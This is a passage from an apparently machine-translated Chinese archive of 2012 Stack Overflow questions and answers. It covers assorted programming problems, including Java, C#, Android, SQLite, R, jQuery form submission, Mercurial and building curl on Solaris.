        }catch (FileNotFoundException e){e.printStackTrace();}
         catch (IOException e){e.printStackTrace();}
    String line=buff.readLine();
    System.out.println(line.contains(DELETE_REGEX));
    }
} 
```

我的文件只包含以下行：

`{"delete":{"status":{"user_id_str":"123456789","user_id":123456789,"id_str":"987654321","id":987654321}}}`

但这打印出错误......我的正则表达式错了吗？我`{`通过双重转义来匹配它，`\\{`正如它[在这里](http://docs.oracle.com/javase/1.4.2/docs/api/java/util/regex/Pattern.html#sum)建议的那样。

> 字符串文字`"\(hello\)"`是非法的，会导致编译时错误；为了匹配字符串 (hello)，`"\\(hello\\)"`必须使用字符串文字。

我`"`使用`\"`.

那么我该如何修复我的程序呢？

*ps 我试过手动输入`line = "\{\"delete"`（不需要双重转义，因为行是字符串而不是正则表达式），我得到了相同的结果。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-27T14:55:07.767

String.contains() 执行完全匹配，而不是正则表达式搜索。不要转义 { 大括号。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-27T14:55:30.077

[contains](http://docs.oracle.com/javase/7/docs/api/java/lang/String.html#contains%28java.lang.CharSequence%29)方法不采用正则表达式作为参数，因此您不必转义`{`.

简单地做

```
line.contains("{\"delete") 
```

# c# - 如何在鼠标悬停时检测和突出显示矩形

> ID：12624193
> 
> 赞同：4
> 
> 时间：2012-09-27T14:52:16.163
> 
> 标签：c#, .net, window, gdi+

我在 C#.net 中创建了一个 Windows 应用程序控件，以图形模式显示一些对象。为此，我根据列表中的项目数创建了一个矩形，并使用 Control OnPaint 事件将其绘制在控件上。

现在，如果鼠标悬停在该矩形上，我想突出显示该矩形。

请检查附加图像以获得更清晰的信息并建议我如何实现它。

![在此处输入图像描述](../Images/e134aa51e0944de8a04de6a8e6026e60.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T15:05:16.080

你检查过经典的 DrawCli 例子吗？它显示了基本应用程序应如何管理对象和工具。

简而言之，您应该在`MouseMove`事件中重新枚举列表，获取项目的矩形并将其`IsFocused`属性设置为 true，如果鼠标指针在该矩形内。如果有变化，则重新绘制。您甚至可以在您的内部`OnPaint`（检查当前鼠标位置）执行此操作，但是您必须始终重新绘制内部的所有内容`MouseMove`（这是一个非常糟糕的主意）。

一种伪代码来解释我的意思：

```
protected override void OnPaint(PaintEventArgs e)
{
   foreach (GraphicalObject obj in Objects)
   {
      if (!obj.IsVisible)
            continue;

      Rectangle rect = obj.GetBounds(e.Graphics);
      if (!rect.Intersects(e.ClipRectangle))
         continue;

      obj.Draw(e.Graphics);
   }
} 
```

`GraphicalObject`是您可以放在屏幕上的所有对象的基本类型。`Objects`是一个包含它们集合的属性（`GraphicalObjectCollection`例如 ）。现在您的代码可能是这样的（请注意，这与真正的代码相去甚远，这只是一般技术的一个示例）：

```
protected override OnMouseMove(MouseMoveEventArgs e)
{
   bool needToRedraw = false;

   using (Graphics g = CreateGraphics())
   {
      foreach (GraphicalObject obj in Objects)
      {
         if (!obj.IsVisible)
               continue;

         Rectangle rect = obj.GetBounds(e.Graphics);
         if (rect.Contains(e.Location))
         {
            if (!obj.IsFocused)
            {
               obj.IsFocused = true;
               needToRedraw = true;
            }
         }
         else
         {
            if (obj.IsFocused)
            {
               obj.IsFocused = false;
               needToRedraw = true;
            }
         }

         obj.Draw(e.Graphics);
      }
   }

   if (needToRedraw)
      Invalidate();
} 
```

# android - sendEmptyMessageAtTime 问题

> ID：12624194
> 
> 赞同：2
> 
> 时间：2012-09-27T14:52:21.967
> 
> 标签：android

我定义的处理程序没有使用 sendEmptyMessageAtTime 设置消息。我从 updateTime.getTimeInMillis 得到的时间是有效的。我在这里想念什么？

```
@Override
protected void onResume() {
    super.onResume();
    mNavigationBarFragment.configureFor(0);
    Calendar updateTime = Calendar.getInstance();
    updateTime.set(Calendar.YEAR, 2012);
    updateTime.set(Calendar.HOUR_OF_DAY, 18);
    updateTime.set(Calendar.MINUTE, 40);
    updateTime.set(Calendar.SECOND, 0);
    if(mUpdateOnAirLabel.sendEmptyMessageAtTime(1, updateTime.getTimeInMillis())){
    // messages gets placed
    }
}

private Handler mUpdateOnAirLabel = new Handler() {
    public void dispatchMessage(android.os.Message msg) {
    // doesn't get triggered
}

public void handleMessage(android.os.Message msg) {
    // doesn't get triggered
}
}; 
```

**UPD** 我从日历对象得到的时间是正确的：

```
<?php

echo date("r", 1348753200578 / 1000); 
```

输出：2012 年 9 月 27 日星期四 17:40:00 +0400

之后，我尝试从当前时间戳偏移

```
Calendar now = Calendar.getInstance(); 
long nowt = now.getTimeInMillis();
if(mUpdateOnAirLabel.sendEmptyMessageAtTime(1, now.getTimeInMillis() + 5000)){
        ...
} 
```

它也没有触发。这里有什么问题？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-09-27T14:58:18.357

你没有指定日期！把 Calendar.DAY_OF_YEAR 或类似的东西！

# javascript - Telerik Mvc Upload 更改删除按钮的样式

> ID：12624196
> 
> 赞同：0
> 
> 时间：2012-09-27T14:52:28.200
> 
> 标签：javascript, asp.net-mvc, telerik, telerik-mvc

如何更改 Telerik mvc 上传控件的“删除”按钮的文本和图标？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T16:12:51.867

如果 API 没有公开它，您将不得不检查 HTML 输出并使用 Javascript 代码来更新它。或者，我认为扩展返回一个 IHtmlString（自从我使用它们以来已经有一点），您可以返回字符串，调用 ToHtmlString()，解析字符串以查找“删除”并将其替换为其他内容，然后渲染出修改后的结果。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-27T16:42:26.093

更改图标非常简单，只需添加以下 css：

```
#WindowUpload .t-icon.t-delete{
height:16px !important;
width:16px !important; 
background-position: -16px -336px !important;} 
```

我在更改文本“删除”时遇到了麻烦，因为我试图在 OnSucess 事件中更改它，而 t-delete 还不存在（只有 t-cancel）。在 OnComplete 事件中进行更改就可以了。

```
function OnComplete() {

$(".t-upload-action").first().text(" ").prepend("<span class='t-icon t-delete'>");} 
```

# java - 在 Android 和 ContentValues 的 Sqlite 中更新值

> ID：12624198
> 
> 赞同：0
> 
> 时间：2012-09-27T14:52:43.370
> 
> 标签：java, android, sql, sqlite

我想更新表中的一行，将所有列更新为新值，除了应该在旧值和新值之间保持最大值的列。

是否有某种方法可以在不创建原始查询的情况下（例如使用[`update(String table, ContentValues values, String whereClause, String\[\] whereArgs)`](http://developer.android.com/reference/android/database/sqlite/SQLiteDatabase.html#update%28java.lang.String,%20android.content.ContentValues,%20java.lang.String,%20java.lang.String%5B%5D%29)函数或使用 ContentValues 的其他类似方法）来获取该提供者的字符转义和其他优势？

我想要实现的查询类似于：

```
UPDATE users SET name='newName', address='newAddress',
                 lastLogin=GREATEST(lastLogin,1348757941); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T15:16:11.783

该`GREATEST`函数实际上被调用[`MAX`](http://www.sqlite.org/lang_corefunc.html#maxoreunc)：

```
UPDATE users
SET name = 'newName',
    address = 'newAddress',
    lastLogin = MAX(lastLogin, 1348757941) 
```

# c# - 将文本框插入 Gridview

> ID：12624203
> 
> 赞同：1
> 
> 时间：2012-09-27T14:52:57.990
> 
> 标签：c#, asp.net, gridview, textbox, webforms

我有一个 Gridview，它的数据源设置为 DataTable。之所以这样做，是因为所需的数据未保存在数据库中。以这种方式生成两列。我需要的是第三列有一个文本框，所以用户可以输入他们的评论等。

我的代码是

```
 Dim dt As DataTable = New DataTable
    Dim row As DataRow

    ' Generate Columns
    dt.Columns.Add("Col One")
    dt.Columns.Add("Col Two")
    dt.Columns.Add("Textbox Col")

    ' Populate rows with required data
    row = dt.NewRow
    row.Item("Col One") = SomeData
    row.Item("Col Two") = SecondaryData
    row.Item("Textbox Col") = InsertTextbox("data")

    ' Add row to DataTable
    dt.Rows.Add(row)

    gvData.DataSource = dt
    gvData.DataBind() 
```

上面的代码完全符合我的要求，除了插入文本框（InsertTextbox）。文本框代码是

```
Private Function InsertTextbox(ByVal TBText As String) As TextBox
    Dim tbox As TextBox = New TextBox

    With tbox
        .Width = 100
        .Height = 25
        .Text = TextboxText
        .ID = TextboxText
    End With

    gvData.Controls.Add(txtbox)

    Return txtbox
End Function 
```

上面的代码已经更改了几次，以查看我如何允许将文本框插入到 gridview 单元格中。

目前我根据需要取回数据，但 Textbox Col 显示为 System.Web.UI.WebControls.TextBox。添加 .Text 会显示文本（在本例中为数据），但它以标签格式显示，这意味着您无法在其中输入任何内容。

谁能建议我如何以这种方式插入文本框？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T16:08:27.957

`Templatefield`在 gridview 中定义 a并`PlaceHolder`在`Templatefield`.

```
<asp:GridView ID="GridView1" runat="server" >
   <Columns>
      <asp:TemplateField>
         <ItemTemplate>
              <asp:PlaceHolder ID="PlaceHolder_InputControl" runat="server" />
         </ItemTemplate>
       </asp:TemplateField>
   </Columns> 
```

使用`RowCreated event`动态添加文本框：

```
Protected Sub GridView1_RowCreated(sender As Object, e As GridViewRowEventArgs)

    If e.Row.RowType = DataControlRowType.DataRow Then
        Dim pc1 As PlaceHolder = DirectCast(e.Row.Cells(0).Controls(1), PlaceHolder)
        Dim tb As TextBox = New TextBox
        With tb
                .Width = 100
                .Height = 25
                .Text = TextboxText
                .ID = TextboxText
        End With
        pc1.Controls.Add(tb)
    End If

End Sub 
```

# ant - 我无法在 FDT 中运行一些 Ant 任务

> ID：12624204
> 
> 赞同：0
> 
> 时间：2012-09-27T14:53:04.120
> 
> 标签：ant, fdt, launching

我的一些 Ant 任务在 FDT 中失败。错误通常是：

```
BUILD FAILED
Problem: failed to create task or type fdt.invoke.launchConfiguration
Cause: The name is undefined.
Action: Check the spelling.
Action: Check that any custom tasks/types have been declared.
Action: Check that any <presetdef>/<macrodef> declarations have taken place 
```

到底是怎么回事？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T14:53:04.120

您需要确保 Ant 脚本运行的 JRE 与您的工作区相同。

![在此处输入图像描述](../Images/031385e34598a016a58af4ca97f30330.png) ![在此处输入图像描述](../Images/a508d26f989a90ae6417ef907f81e86c.png)

# frameworks - Joomla 不显示龙门主题的菜单和模块

> ID：12624206
> 
> 赞同：0
> 
> 时间：2012-09-27T14:53:12.713
> 
> 标签：frameworks, joomla, joomla1.5

我正在尝试安装一个使用 Gantry 框架的主题。所有常规主题都可以正常工作，但龙门主题仅显示文章（无菜单、无模块、空白侧边栏）。

我尝试单独安装龙门框架，我也尝试使用 bundle (theme + fw) 但结果仍然相同。

我正在使用 Joomla 1.5.26 和 Gantry 3.1.20（但在 Joomla admin 中它说 v3.0.3 for Gantry ）。

什么会导致这种情况？在龙门文档中没有找到解决方案。

抱歉，如果我遗漏了一些明显的东西，我正在使用 Joomla 迈出第一步，我需要在一开始就使用 Gantry 主题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T15:36:58.000

Gantry模板使用不同的模块位置，例如“sidebar-a”而不是“right”，因此如果您有一个属于“right”位置的模块，则在安装Gantry模板时它不会显示。如果你想拥有演示网站上的模板，你应该下载包含整个Joomla系统+模板和演示内容的demo/quickstart包。注意，如果Gantry模板不是来自Rockettheme网站，他们可能不提供demo/quickstart包。在这种情况下，您将需要查看所有模板位置并相应地分配您当前的模块。

希望这可以帮助

# version-control - Mercurial - 如何获取两个存储库之间不同的文件列表

> ID：12624208
> 
> 赞同：0
> 
> 时间：2012-09-27T14:53:15.603
> 
> 标签：version-control, mercurial

我有两个相关的 Mercurial 存储库。存储库 A 有很多不在存储库 B 中的更改。我想生成存储库 A 和存储库 B 之间不同的文件名列表

这是我到目前为止所拥有的：

一个名为 hg_outconfig.txt 的文本文件，其中包含以下文本：

```
changeset = "{file_mods}\n{file_dels}\n{file_adds}"
file_mod = "{file_mod}\n"
file_add = "{file_add}\n"
file_del = "{file_del}\n" 
```

然后我运行命令：

```
cd PATH_TO_REPO_A
hg -q outgoing URL_TO_REPO_B --style c:\\hg_outconfig.txt | sort 
```

这确实列出了 repo A 中所有已更改的文件，但它还列出了 repo A 中的文件，这些文件与之前已经在 repo B 中的提交相比发生了更改。我只想要一个在 repo A 和 repo B 之间存在当前差异的文件列表.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T14:13:11.317

好的，我想出了如何做到这一点。为了列出传出文件并排除合并，您可以将 -M 参数与传出命令一起使用。所以

```
hg -q outgoing -M remote_repo_url 
```

将为您提供两个存储库之间不同的文件列表。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T16:19:19.497

`... --template "{files}\n"`会给你远非漂亮和漂亮，但正确的输出

从我的测试

```
hg incoming --template="{files}\n" -q
footer.php functions.php header.php readme.txt search.php style.css
comments.php functions.php header.php readme.txt sidebar.php style.css
readme.txt sidebar.php style.css
functions.php readme.txt screenshot.png style.css 
```

4 个字符串是 4 个变更集，变更集中的文件以空格分隔

# unix - 在 Solaris 10 上安装 Curl 时遇到问题

> ID：12624210
> 
> 赞同：3
> 
> 时间：2012-09-27T14:53:26.970
> 
> 标签：unix, curl, installation, solaris

这就是我正在做的事情，这纯粹是通过我的 Windows 系统上的 PuTTy 到 Solaris VM 上。

```
# ls
curl-7.27.0          curl-7.27.0.tar.bz2  hostName.pl          starthere.desktop
# cd curl-7.27.0
# ls
Android.mk           README               configure.ac         m4
CHANGES              RELEASE-NOTES        curl-config.in       maketgz
CMake                acinclude.m4         curl-style.el        missing
CMakeLists.txt       aclocal.m4           depcomp              mkinstalldirs
COPYING              buildconf            docs                 packages
MacOSX-Framework     compile              include              sample.emacs
Makefile             config.guess         install-sh           src
Makefile.am          config.log           lib                  tests
Makefile.in          config.sub           libcurl.pc.in        vc6curl.dsw
Makefile.msvc.names  configure            ltmain.sh            winbuild
# ./configure
checking whether to enable maintainer-specific portions of Makefiles... no
checking whether to enable debug build options... no
checking whether to enable compiler optimizer... (assumed) yes
checking whether to enable strict compiler warnings... no
checking whether to enable compiler warnings as errors... no
checking whether to enable curl debug memory tracking... no
checking whether to enable hiding of library internal symbols... yes
checking whether to enable c-ares for DNS lookups... no
checking for sed... /usr/bin/sed
checking for grep... /usr/bin/grep
checking for egrep... /usr/bin/egrep
checking for ar... no
configure: error: ar not found in PATH. Cannot continue without ar.
# 
```

它位于我的桌面上。有什么建议么？我用谷歌搜索并没有任何结果=/让我知道这是否属于其他地方...

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-17T11:58:07.790

对于 Solaris 10，ar 包含在 SUNWbtool 软件包中。对于 Solaris 11，ar 包含在 system/linker 包中。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-06T11:16:27.440

ar 是 GNU 归档器

您需要确保提供 ar 的 binutils 在您的系统上可用。

我不熟悉 Solaris，但似乎安装“binutils”包应该可以帮助你：[http](http://www.opencsw.org/packages/binutils/) ://www.opencsw.org/packages/binutils/ 。

# axapta - DAX 企业门户 == Sharepoint 门户

> ID：12624212
> 
> 赞同：-1
> 
> 时间：2012-09-27T14:53:35.290
> 
> 标签：axapta

只是想知道 DAX EP 是否与 SP 相同。换句话说，如果我们有使用 Sharepoint 的经验，我们是否需要针对 DAX EP 进行单独的培训。任何人都可以请确认。谢谢， N

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T10:07:58.340

[AX Enterprise Portal](http://msdn.microsoft.com/en-us/library/aa855178.aspx)是一个通过[AX 应用程序对象服务器](http://msdn.microsoft.com/en-us/library/aa623946.aspx)访问数据的[SharePoint 应用程序](http://office.microsoft.com/en-us/sharepoint-designer-help/introduction-to-building-sharepoint-applications-HA010239046.aspx)。

结论：EP != SharePoint

我无法猜测您是否需要根据该信息进行培训。

# r - 在数据框的一行中查找唯一值

> ID：12624214
> 
> 赞同：1
> 
> 时间：2012-09-27T14:53:38.543
> 
> 标签：r

我有 2 个数据框，其中包含人们购买的产品的序列号，按购买次数排序。第一列是 custId，接下来的 5 列是序列号，按购买的商品数量从左到右排序。

df1

```
 id col1 col2 col3 col4 col5
1  1 4742  927 7889   NA   NA
2  2 4964 9295 9174  228 9470
3  3 5834 7758   NA   NA   NA
4  4 2802 9984  323   NA   NA
5  5  179  198 3996 6801 7561
6  6 7755 1252 9684 9940   NA 
```

df2

```
 id col6 col7 col8 col9 col10
1  1 1816 6686   NA   NA    NA
2  2 6141 9728 6981 3089  5674
3  3 5659 3931 5022 4361  9264
4  4 3210 2488 9939 7543  7757
5  5 9213 1372 4374 7962  4983
6  6 3451 5646 6069   NA    NA 
```

我正在尝试将它们合并为一组 5 个序列号，如下所示：

```
 id col1 col2 col3 col4 col5
1  1 4742  927 7889 1816 6686   
2  2 4964 9295 9174  228 9470
3  3 5834 7758 5022 4361 9264
4  4 2802 9984  323 7543 7757
5  5  179  198 3996 6801 7561
6  6 7755 1252 9684 9940 3451 
```

有几个问题。

1）如何在一行中找到唯一值。

2）如何保持跨行秩序。

有什么建议么？

```
> dput(df1)
structure(list(id = c(1, 2, 3, 4, 5, 6, 7, 8, 9, 10), col1 = c(4742, 
4964, 5834, 2802, 179, 7755, 6467, 8671, 2910, 150), col2 = c(927, 
9295, 7758, 9984, 198, 1252, 1664, 5242, 6995, 3875), col3 = c(7889, 
9174, NA, 323, 3996, 9684, 1150, 2973, 9948, 8598), col4 = c(NA, 
228, NA, NA, 6801, 9940, 854, 4744, 4006, 3196), col5 = c(NA, 
9470, NA, NA, 7561, NA, 4342, 1791, 286, 7425)), .Names = c("id", 
"col1", "col2", "col3", "col4", "col5"), row.names = c(NA, -10L
), class = "data.frame")
> dput(df2)
structure(list(id = c(1, 2, 3, 4, 5, 6, 7, 8, 9, 10), col6 = c(1816, 
6141, 5659, 3210, 9213, 3451, 2440, 5706, 5281, 7110), col7 = c(6686, 
9728, 3931, 2488, 1372, 5646, 2641, 7851, 5581, 5775), col8 = c(NA, 
6981, 5022, 9939, 4374, 6069, 7525, 4927, 9767, 1331), col9 = c(NA, 
3089, 4361, 7543, 7962, NA, 7526, 4215, 9923, 9887), col10 = c(NA, 
5674, 9264, 7757, 4983, NA, 9996, 5886, 9546, 9419)), .Names = c("id", 
"col6", "col7", "col8", "col9", "col10"), row.names = c(NA, -10L
), class = "data.frame") 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T15:21:50.313

这有效：

```
df3 <- cbind(df1,df2[,-1])

subs <- function(x){
  temp <- df3[x,][!is.na(df3[x,])]
  temp2 <- 11-length(temp)
  temp <- c(temp,rep(NA,temp2))
  df3[x,] <<- temp
}

for(i in 1:nrow(df3)){
  subs(i)
}

final.df <- df3[,1:6]

> final.df
   id col1 col2 col3 col4 col5
1   1 4742  927 7889 1816 6686
2   2 4964 9295 9174  228 9470
3   3 5834 7758 5659 3931 5022
4   4 2802 9984  323 3210 2488
5   5  179  198 3996 6801 7561
6   6 7755 1252 9684 9940 3451
7   7 6467 1664 1150  854 4342
8   8 8671 5242 2973 4744 1791
9   9 2910 6995 9948 4006  286
10 10  150 3875 8598 3196 7425 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-27T15:18:22.923

我认为这会起作用：

```
x <- cbind(df1[, -1], df2[, -1])
dups <- function(x) x[!duplicated(x)]
new.df <- data.frame(df1[, 1, drop=FALSE], 
    t(apply(x, 1, function(x) dups(na.omit(x))[1:5])))

colnames(new.df)[-1] <- colnames(df1[, -1])
new.df 
```

产生：

```
 id col1 col2 col3 col4 col5
1   1 4742  927 7889 1816 6686
2   2 4964 9295 9174  228 9470
3   3 5834 7758 5659 3931 5022
4   4 2802 9984  323 3210 2488
5   5  179  198 3996 6801 7561
6   6 7755 1252 9684 9940 3451
7   7 6467 1664 1150  854 4342
8   8 8671 5242 2973 4744 1791
9   9 2910 6995 9948 4006  286
10 10  150 3875 8598 3196 7425 
```

# java - 如何在两个应用程序之间使用 jquery ajax post 调用 spring mvc3？

> ID：12624219
> 
> 赞同：0
> 
> 时间：2012-09-27T14:53:50.670
> 
> 标签：java, jquery, spring-mvc

我在服务器上托管了两个 Web 应用程序。从一个我试图做 $.post 到第二个应用程序（spring mvc3）。我能够成功点击第二个应用程序的 url，但我没有得到 ajax 调用的响应。

App1 JS 代码 (http://localhost:7777/app1/test.html) -

```
var serialisedFormData = $("form").serialize();
 $.post("http://localhost:8080/app2/doSomething", serialisedFormData, function (data) {
        alert("job done");        
    }, "json"); 
```

App2 Java 代码 -

```
 @RequestMapping(value = "/doSomething")
        public @ResponseBody String doSomething(HttpServletRequest request, 
 @RequestParam("d") String data) {

            try {
                   ... do something here ...
                   return "done";
            }
            catch (Exception e) {
                logger.debug("Exception occured when doing something", e);
                return "failure";
            }
        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-04T09:05:52.543

我通过从我的 jquery post call 中删除“json”类型来实现它。

```
$.post("http://localhost:8080/app2/doSomething", serialisedFormData, function (data) {
        alert("job done");        
    }); 
```

并在我的回复中添加标题

```
@RequestMapping(value = "/doSomething")
        public @ResponseBody String doSomething(HttpServletRequest request, HttpServletResponse response, @RequestParam("d") String data) 
     {

            try {
                   ... do something here ...
                   response.setHeader("Access-Control-Allow-Origin", "*");
                   return "done";
            }
            catch (Exception e) {
                logger.debug("Exception occured when doing something", e);
                return "failure";
            }
        } 
```

# asp.net - 多行 ASP.NET 文本框的 Facebook 蓝色突出显示

> ID：12624221
> 
> 赞同：0
> 
> 时间：2012-09-27T14:53:53.997
> 
> 标签：asp.net, css, facebook, autocomplete, textbox

我正在尝试在用户为多行 ASP.Net 文本框键入 @ 后实现 Facebook 自动完成功能，包括突出显示选定的文本（这只是文本框中文本的一部分）。

我的问题是：是否可以在文本框中应用不同的样式，或者 Facebook 如何以蓝色突出显示用户从完成列表中选择的内容？如何使用我的文本框获得相同的结果？据我所知，不能在同一个文本框中应用不同的 CSS。

请帮助和鼓励我。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T15:04:02.710

> 是否可以在文本框中应用不同的样式

不。

> 或者 Facebook 如何以蓝色突出显示用户从完成列表中选择的内容？

*contentEditable*是您的关键字。这是在较新的浏览器中实现的一种机制，可以使文档的某些部分“可编辑”；并且随着 HTML5 变得标准化。

# java - 在 Java 组件上查找空间以进行绘制

> ID：12624225
> 
> 赞同：1
> 
> 时间：2012-09-27T14:54:09.493
> 
> 标签：java, algorithm, swing

我有一个 java 组件，我在其上绘制 100 x 40 个矩形来表示图形的节点。添加新节点时，我希望能够将其定位在有用的位置。目前，我只需选择 x 轴上的下一个可用空间。但是，这意味着当我加载图表时，我会得到一大串节点跨越右侧的视图 - 不理想！

更好的解决方案可能涉及在最接近用户视图中心点的点处添加一个节点。我确信这个问题有很多解决方案，我想不出一种合理的方法来实现这一点。

我有与此问题相关的三种方法：

```
positionNode(Node) // which tries to find suitable x,y to place a node
setPos(x,y) // which moves a node to the respective position
findElementAt(x,y) // which returns a node's model if such a node exists at (x,y) 
```

一个潜在的解决方案可能以某种方式涉及围绕中心点盘旋，但我无法想象一个好的解决方案来执行此操作。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T15:48:18.573

图形渲染是一个难题，是许多研究的主题。

如果你想将节点变成一种捆绑，而不是节点线，主要的缺点是从节点出来的线会被其他子节点重叠。

您可以制作方形束或圆形束。要制作方形束，请取节点数的平方根并加一个。例如，如果你有 17 个节点，正方形的边是 4 + 1 = 5。所以你有一个 5 x 5 的正方形。将每个节点放置在正方形的一个单元格中。

做一个圆束画同心圆。所以第一个节点位于中心。然后计算围绕该节点的假想圆。根据您需要多少空间，将圆圈按度数分成几段。然后将每个附加节点定位在每个段的中心。

请注意，您可能希望重叠节点。根据您的界面的工作方式，重叠可能允许您放入更多节点。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-27T15:00:08.670

听起来像是基于力的布局的机会：

[http://en.wikipedia.org/wiki/Force-based_algorithms_(graph_drawing](http://en.wikipedia.org/wiki/Force-based_algorithms_(graph_drawing) )

当你说图表时，我假设节点是相互连接的，所以绘制它们，使它们的线最小地纵横交错，以便更容易可视化图表告诉你的内容似乎很重要。基于强制的布局可以帮助安排图形，使其不会受到许多线相互交叉的“压力”。

# redirect - Zeus 子目录的 301 重定向

> ID：12624226
> 
> 赞同：0
> 
> 时间：2012-09-27T14:54:20.233
> 
> 标签：redirect, rewrite, subdirectory, zeus

我已更改站点中子文件夹的名称，需要知道 rewrite.script 的代码

例子：

我将如何指导[http://www.mydomain/stackoverflow/index](http://www.mydomain/stackoverflow/index)

至

[http://www.mydomain/stackoverflow2/index](http://www.mydomain/stackoverflow2/index)

由于站点很大，我想避免单独编写每个 url 路径。请帮助我在 ZEUS 服务器 ARGH 上！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-16T05:49:01.013

```
match URL into $ with ^/stackoverflow/(.*)
if matched then
      set OUT:Location = /stackoverflow2/$1
    set RESPONSE=301
    set BODY=Page moved
    goto END
endif 
```

# objective-c - IOS Fb墙贴方法不起作用

> ID：12624228
> 
> 赞同：0
> 
> 时间：2012-09-27T14:54:27.677
> 
> 标签：objective-c, cocoa-touch, facebook-graph-api, ios5

我正在使用以下代码。它带我进入我授权应用程序的 FB 对话框，在授权应用程序后它带我回到我的应用程序。但是它从不在墙上张贴任何东西。

有什么想法有什么问题吗？

```
- (void) login 
{
   AppDelegate *appDelegate = (AppDelegate *)[[UIApplication sharedApplication] delegate];

    appDelegate.facebook = [[Facebook alloc] initWithAppId:@"MY_APP_ID" andDelegate:self];

    NSArray* permissions =  [NSArray arrayWithObjects:@"publish_stream", nil];

    [appDelegate.facebook authorize:permissions];

    NSMutableDictionary *params = [NSMutableDictionary dictionaryWithObjectsAndKeys:
                                   @".", @"name",
                                   @".", @"caption",
                                   nil];

    /*
     NSMutableDictionary *params = [NSMutableDictionary dictionaryWithObjectsAndKeys:
     @".", @"name",
     @"Build great social apps and get more installs.", @"caption",
     @"The Facebook SDK for iOS makes it easier and faster to develop Facebook integrated iOS apps.", @"description",
     @"https://developers.facebook.com/ios", @"link",
     @"https://raw.github.com/fbsamples/ios-3.x-howtos/master/Images/iossdk_logo.png", @"picture",
     nil];
     */

    // Invoke the dialog
    [appDelegate.facebook dialog:@"feed" andParams:params andDelegate:self];

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T15:24:46.657

You should do it like this:

```
graphPath = @"me/feed";
[params setObject:@"link" forKey:@"type"];
[params setObject:pict forKey:@"picture"];
[params setObject:self.url forKey:@"link"];
[params setObject:self.message forKey:@"message"];
[params setObject:self.urlName forKey:@"name"];
[params setObject:self.caption forKey:@"caption"];
[params setObject:self.urlDescription forKey:@"description"];
[appDelegate.facebook requestWithGraphPath:graphPath andParams:params andHttpMethod:@"POST" andDelegate:self]; 
```

# jquery - JQuery post在地址栏中返回查询字符串

> ID：12624230
> 
> 赞同：1
> 
> 时间：2012-09-27T14:54:35.663
> 
> 标签：jquery, ajax

我正在用 JQuery 开发一个 web 表单并通过 post 发送到 PHP 页面。

它看起来像这样：

```
$('#form-signup').submit(function(e)
{
    $.ajax(
    {
        type: 'POST',
        data: { name: $('#name').val() },
        url: 'signup_backend.php',
        success: function(data, textStatus, jqXHR)
        {
        },
        error: function(jqXHR, textStatus, errorThrown)
        {
            alert('error');
        }
    }); 
```

我的网络表单如下所示：

```
<form id="form-signup" action="">
    <fieldset>
        <label for="name">Nome</label>
        <input type="text" id="name" name="name" value="<?=$name?>"><span class="required">*</span>
    </fieldset>
    <fieldset>
        <label for="email">Email</label>
        <input type="email" id="email" name="email" value="<?=$email?>"><span class="required">*</span>
    </fieldset>
    <fieldset>
        <label for="tel">Telefone</label><input type="tel" id="tel" name="tel" value="<?=$tel?>"><span class="required">*</span>
    </fieldset>
    <fieldset>
        <div>
            <label class="blocker">Tipo de anunciante</label><span class="required">*</span>
        </div>
        <input type="radio" name="advertiser" id="advertiser_1">
        <label for="advertiser_1" class="aleft">Particular</label>
        <input type="radio" name="advertiser" id="advertiser_2">
        <label for="advertiser_2" class="aleft">Imobiliária</label>
    </fieldset>
    <fieldset>
        <label for="password">Senha</label>
        <input type="password" id="password" name="password" value="<?=$password?>"><span class="required">*</span>
    </fieldset>
    <fieldset>
        <label for="check-password">Confirmação da senha</label>
        <input type="password" id="check-password" name="check_password" value="<?=$check_password?>"><span class="required">*</span>
    </fieldset>
    <fieldset>
        <input type="submit" value="Enviar" id="sub">
    </fieldset>
</form> 
```

当我收到退货时，我的地址显示如下：

```
http://localhost:8888/guia/web/adm/signup.php?name=John&email=&tel=&password=&check_password= 
```

有没有办法避免我的地址栏中的这些数据？

多谢你们

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-27T14:57:52.183

防止表单提交的默认操作

```
$('#form-signup').submit(function(e){
    e.preventDefault(); /// <--- THIS LINE
    $.ajax({
        type: 'POST',
        data: {name: $('#name').val()},
        url: 'signup_backend.php',
        success: function(data, textStatus, jqXHR){

        },
        error: function(jqXHR, textStatus, errorThrown){
            alert('error');
        }
    });
}); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-27T14:58:19.997

您是否尝试过在处理程序结束时返回 false （对于提交函数）？

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-27T14:58:22.573

看起来您并没有阻止`submit`事件的默认行为（提交表单），因此在提交表单时您会同时收到 AJAX POST 请求和正常的 GET 表单提交。

添加这个：

```
e.preventDefault(); 
```

在您的`submit`事件处理函数中，以防止默认表单提交并*仅*发送 AJAX POST 请求。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-01-19T22:18:30.057

另一种依赖于`jQuery.ajax([settings])`.

```
$.ajax({
    processData : false
)}; 
```

